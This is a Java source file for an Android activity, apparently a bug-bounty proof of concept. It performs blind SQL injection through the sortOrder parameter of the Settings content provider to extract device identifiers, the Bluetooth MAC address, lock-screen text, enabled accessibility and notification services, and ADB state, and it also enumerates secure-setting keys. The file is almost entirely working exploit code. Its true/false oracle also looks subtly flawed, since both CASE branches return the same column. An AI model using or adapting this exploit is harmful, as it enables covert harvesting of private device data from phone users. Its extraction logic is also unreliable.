package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SettingsBlindExtractActivity extends Activity {
    private static final String TAG = "SettingsBlind";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("Settings.Secure/Global Blind Extraction\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        log("=== Settings.Secure Sensitive Key Extraction ===\n");

        // All these via SettingsProvider sortOrder blind injection
        String secureUri = "content://settings/secure";
        String globalUri = "content://settings/global";

        String[][] secureKeys = {
            {"android_id", "Device unique identifier"},
            {"bluetooth_address", "BT MAC address"},
            {"bluetooth_name", "BT device name"},
            {"lock_screen_owner_info", "Lock screen message"},
            {"enabled_accessibility_services", "Accessibility services"},
            {"enabled_notification_listeners", "Notification listeners"},
            {"default_input_method", "Default keyboard"},
            {"enabled_input_methods", "Enabled keyboards"},
            {"backup_transport", "Backup service"},
            {"selected_spell_checker", "Spell checker"},
            {"location_providers_allowed", "Location providers"},
            {"device_name", "Device name"},
            {"user_setup_complete", "Setup complete"},
            {"install_non_market_apps", "Sideload enabled"},
            {"lockdown", "VPN lockdown"},
            {"long_press_timeout", "Long press timeout"},
            {"nfc_payment_default_component", "NFC payment component"},
            {"assistant", "Digital assistant"},
            {"sms_default_application", "Default SMS app"},
            {"dialer_default_application", "Default dialer"},
            {"voice_interaction_service", "Voice service"},
        };

        for (String[] pair : secureKeys) {
            String val = blindExtract(secureUri, "(SELECT value FROM secure WHERE name='" + pair[0] + "')", 100);
            if (!val.equals("(empty)")) {
                log("[SECURE] " + pair[0] + " = " + val);
                log("  (" + pair[1] + ")");
            }
        }

        log("\n=== Settings.Global Sensitive Keys ===\n");

        String[][] globalKeys = {
            {"adb_enabled", "ADB debugging enabled"},
            {"development_settings_enabled", "Dev settings"},
            {"device_name", "Device name"},
            {"wifi_on", "WiFi state"},
            {"bluetooth_on", "Bluetooth state"},
            {"mobile_data", "Mobile data"},
            {"airplane_mode_on", "Airplane mode"},
            {"usb_mass_storage_enabled", "USB storage"},
            {"stay_on_while_plugged_in", "Stay on plugged"},
            {"package_verifier_enable", "Package verifier"},
            {"multi_sim_voice_call_subscription", "Voice SIM"},
            {"multi_sim_data_call_subscription", "Data SIM"},
            {"low_power_trigger_level", "Battery saver trigger"},
        };

        for (String[] pair : globalKeys) {
            String val = blindExtract(globalUri, "(SELECT value FROM global WHERE name='" + pair[0] + "')", 50);
            if (!val.equals("(empty)")) {
                log("[GLOBAL] " + pair[0] + " = " + val);
            }
        }

        // Enumerate ALL secure settings keys (just names, not values)
        log("\n=== Full Settings.Secure Key Enumeration ===\n");
        int secureCount = blindCount(secureUri, "(SELECT count(*) FROM secure)");
        log("Total Settings.Secure entries: " + secureCount);

        // Extract first 30 key names
        for (int i = 0; i < Math.min(secureCount, 30); i++) {
            String key = blindExtract(secureUri,
                "(SELECT name FROM secure ORDER BY name LIMIT 1 OFFSET " + i + ")", 60);
            log("  key[" + i + "]: " + key);
        }

        log("\n=== SETTINGS EXTRACTION COMPLETE ===");
    }

    private boolean blindBool(String uri, String condition) {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(uri), new String[]{"name"}, null, null,
                "CASE WHEN " + condition + " THEN name ELSE name END ASC");
            if (c != null) { c.close(); return true; }
        } catch (Exception e) { }
        return false;
    }

    private int blindCount(String uri, String subquery) {
        int lo = 0, hi = 1000;
        if (!blindBool(uri, subquery + ">0")) return 0;
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (blindBool(uri, subquery + ">=" + mid)) lo = mid;
            else hi = mid - 1;
            if (hi - lo <= 1) {
                if (blindBool(uri, subquery + "=" + hi)) return hi;
                return lo;
            }
        }
        return lo;
    }

    private String blindExtract(String uri, String subquery, int maxLen) {
        StringBuilder sb = new StringBuilder();
        int len = blindCount(uri, "(SELECT length(" + subquery + "))");
        if (len == 0) return "(empty)";
        len = Math.min(len, maxLen);
        for (int pos = 1; pos <= len; pos++) {
            String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
            int lo = 32, hi = 126;
            while (lo < hi) {
                int mid = (lo + hi + 1) / 2;
                if (blindBool(uri, expr + ">=" + mid)) lo = mid;
                else hi = mid - 1;
            }
            if (blindBool(uri, expr + "=" + lo)) sb.append((char) lo);
            else sb.append('?');
        }
        return sb.toString();
    }
}
